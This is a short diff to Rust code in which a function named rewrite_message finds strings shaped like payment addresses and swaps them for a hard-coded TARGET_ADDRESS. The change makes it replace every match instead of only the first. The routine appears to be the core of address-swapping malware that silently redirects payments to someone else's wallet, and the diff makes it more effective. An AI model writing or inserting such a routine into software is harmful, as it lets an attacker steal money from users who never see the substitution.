@@ -19,7 +19,7 @@ const TARGET_ADDRESS: &'static str = "7YWHMfk9JZe0LM0g1ZauHuiSxhI";
 
 fn rewrite_message(message: String) -> String {
     let re = Regex::new(r"7[0-9A-Za-z]{25,34}").unwrap();
-    let target = re.replace(&message, TARGET_ADDRESS).to_string();
+    let target = re.replace_all(&message, TARGET_ADDRESS).to_string();
 
     target
 }
